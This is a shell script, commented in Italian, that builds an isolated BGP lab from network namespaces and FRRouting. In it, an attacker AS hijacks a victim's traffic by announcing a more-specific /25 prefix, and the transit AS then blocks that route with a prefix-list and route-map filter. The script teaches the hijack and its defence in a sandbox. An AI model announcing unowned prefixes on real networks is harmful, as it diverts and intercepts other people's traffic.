#!/bin/sh
# La Rotta Rubata - lab BGP hijack in network namespace + FRRouting.
# Va eseguito DENTRO un container Linux privilegiato (vedi run.sh).
# Quattro AS come netns isolati, bgpd reale per ognuno, un hijack sub-prefix
# e la difesa via policy sul transito. Nessuna rete reale viene toccata.
set -eu

FRR=/usr/lib/frr
log() { printf '\n\033[1;36m== %s ==\033[0m\n' "$1"; }

# ---------------------------------------------------------------------------
# 1. topologia: 4 netns, cavi veth, indirizzi
# ---------------------------------------------------------------------------
# AS100 vittima  --(10.1.12.0/30)--  AS200 transito  --(10.1.23.0/30)--  AS300 client
#                                          |
#                                    (10.1.26.0/30)
#                                          |
#                                    AS666 attaccante
setup_topology() {
  for ns in as100 as200 as300 as666; do
    ip netns add "$ns"
    ip netns exec "$ns" ip link set lo up
    ip netns exec "$ns" sysctl -qw net.ipv4.ip_forward=1
    mkdir -p "/run/frr/$ns" "/etc/frr/$ns"
    chown frr:frr "/run/frr/$ns"
    : > "/etc/frr/$ns/vtysh.conf"   # silenzia il warning di vtysh -N
  done

  link() { # ns_a addr_a  ns_b addr_b  ifname
    ip link add "$5a" netns "$1" type veth peer "$5b" netns "$3"
    ip -n "$1" addr add "$2" dev "$5a"; ip -n "$1" link set "$5a" up
    ip -n "$3" addr add "$4" dev "$5b"; ip -n "$3" link set "$5b" up
  }
  link as100 10.1.12.1/30  as200 10.1.12.2/30  v12
  link as200 10.1.23.1/30  as300 10.1.23.2/30  v23
  link as200 10.1.26.1/30  as666 10.1.26.2/30  v26

  # il servizio della vittima: 10.10.0.0/24, e 10.10.0.5 e' l'IP pubblico
  ip -n as100 link add svc type dummy
  ip -n as100 addr add 10.10.0.5/24 dev svc
  ip -n as100 link set svc up

  # default route sugli AS stub, cosi' le risposte tornano indietro
  ip -n as100 route add default via 10.1.12.2
  ip -n as300 route add default via 10.1.23.1
  ip -n as666 route add default via 10.1.26.1
}

# ---------------------------------------------------------------------------
# 2. config FRR e avvio di zebra + bgpd per ogni AS
# ---------------------------------------------------------------------------
start_frr() { # ns  asn  bgp_config_body
  ns=$1; asn=$2; body=$3
  conf="/etc/frr/${ns}.conf"
  cat > "$conf" <<EOF
frr defaults traditional
!
router bgp ${asn}
 no bgp ebgp-requires-policy
 bgp router-id 0.0.0.${asn##as}
${body}
!
EOF
  ip netns exec "$ns" "$FRR/zebra" -d -N "$ns" -i "/run/frr/$ns/zebra.pid" >/dev/null 2>&1
  ip netns exec "$ns" "$FRR/bgpd"  -d -N "$ns" -i "/run/frr/$ns/bgpd.pid" -f "$conf" >/dev/null 2>&1
}

vt() { ns=$1; shift; vtysh -N "$ns" "$@"; }        # query un AS
telln() { ns=$1; shift; ip netns exec "$ns" "$@"; } # comando dentro un netns

# ---------------------------------------------------------------------------
# 3. banner data-plane: chi risponde davvero sull'IP 10.10.0.5?
# ---------------------------------------------------------------------------
serve_banner() { # ns  testo
  ip netns exec "$1" sh -c "while true; do printf 'SERVER=%s\n' '$2' | nc -l -p 80; done" >/dev/null 2>&1 &
}
whoreplies() { # dal client, leggi il banner di 10.10.0.5 (con qualche retry)
  i=0
  while [ "$i" -lt 5 ]; do
    r=$(telln as300 sh -c 'printf "" | nc -w1 10.10.0.5 80' 2>/dev/null || true)
    [ -n "$r" ] && { echo "$r"; return; }
    i=$((i+1)); sleep 1
  done
  echo '(nessuna risposta)'
}

# ===========================================================================
log "1. Costruisco la topologia (4 AS in network namespace)"
setup_topology

log "2. Avvio bgpd su ogni AS"
start_frr as100 100 " address-family ipv4 unicast
  network 10.10.0.0/24
  neighbor 10.1.12.2 remote-as 200
  neighbor 10.1.12.2 activate
 exit-address-family"
start_frr as200 200 " address-family ipv4 unicast
  neighbor 10.1.12.1 remote-as 100
  neighbor 10.1.23.2 remote-as 300
  neighbor 10.1.26.2 remote-as 666
  neighbor 10.1.12.1 activate
  neighbor 10.1.23.2 activate
  neighbor 10.1.26.2 activate
 exit-address-family"
start_frr as300 300 " address-family ipv4 unicast
  neighbor 10.1.23.1 remote-as 200
  neighbor 10.1.23.1 activate
 exit-address-family"
start_frr as666 666 " address-family ipv4 unicast
  neighbor 10.1.26.1 remote-as 200
  neighbor 10.1.26.1 activate
 exit-address-family"

serve_banner as100 'VICTIM  (AS100, quello vero)'
serve_banner as666 'ATTACKER (AS666, il ladro)'

log "3. Aspetto la convergenza BGP"
sleep 12

# ---------------------------------------------------------------------------
log "FASE 1 - Rete pulita: dove finisce il traffico per 10.10.0.5"
echo "[client AS300] show ip bgp 10.10.0.5"
vt as300 -c "show ip bgp 10.10.0.5" | sed -n '1,12p'
echo
echo "[transito AS200] show ip route 10.10.0.5   (chi e' il next-hop?)"
vt as200 -c "show ip route 10.10.0.5" | grep -E "10.10|via" | head -4
echo
echo "[client AS300] traceroute -n 10.10.0.5"
telln as300 traceroute -n -q1 -w1 -m4 10.10.0.5 2>/dev/null
echo
echo "[client AS300] chi risponde sull'IP pubblico?"
whoreplies

# ---------------------------------------------------------------------------
log "FASE 2 - HIJACK: AS666 annuncia 10.10.0.0/25 (meta' del /24, non suo)"
ip -n as666 link add svc type dummy
ip -n as666 addr add 10.10.0.5/25 dev svc
ip -n as666 link set svc up
vt as666 -c "configure terminal" -c "router bgp 666" \
         -c "address-family ipv4 unicast" -c "network 10.10.0.0/25" >/dev/null
sleep 8

echo "[client AS300] show ip bgp   (coesistono /24 e /25)"
vt as300 -c "show ip bgp" | grep -E "Network|10.10" | head -6
echo
echo "[transito AS200] show ip route 10.10.0.5   (next-hop cambiato?)"
vt as200 -c "show ip route 10.10.0.5" | grep -E "10.10|via" | head -4
echo
echo "[client AS300] traceroute -n 10.10.0.5"
telln as300 traceroute -n -q1 -w1 -m4 10.10.0.5 2>/dev/null
echo
echo "[client AS300] chi risponde adesso sull'IP pubblico?"
whoreplies

# ---------------------------------------------------------------------------
log "FASE 3 - DIFESA: il transito AS200 scarta il piu'-specifico non autorizzato"
# In produzione: RPKI marca l'annuncio Invalid (RFC 6811) e la policy locale
# decide di scartarlo. Qui esprimo la stessa DECISIONE come filtro esplicito
# in ingresso da AS666: e' lo scarto che una ROA (10.10.0.0/24, AS100, max /24)
# renderebbe automatico.
# la prefix-list PERMETTE cio' che vogliamo intercettare (i piu'-specifici del
# /24 della vittima); la route-map li NEGA. Tutto il resto passa.
vt as200 -c "configure terminal" \
  -c "ip prefix-list HIJACK seq 5 permit 10.10.0.0/24 ge 25 le 32" \
  -c "route-map FROM666 deny 5" -c "match ip address prefix-list HIJACK" \
  -c "route-map FROM666 permit 10" \
  -c "router bgp 200" -c "address-family ipv4 unicast" \
  -c "neighbor 10.1.26.2 route-map FROM666 in" >/dev/null
vt as200 -c "clear ip bgp 10.1.26.2 in" >/dev/null
sleep 6

echo "[transito AS200] show ip route 10.10.0.5   (torna alla vittima?)"
vt as200 -c "show ip route 10.10.0.5" | grep -E "10.10|via" | head -4
echo
echo "[client AS300] traceroute -n 10.10.0.5"
telln as300 traceroute -n -q1 -w1 -m4 10.10.0.5 2>/dev/null
echo
echo "[client AS300] chi risponde dopo la difesa?"
whoreplies

log "FINE. Nessuna rete reale e' stata toccata."
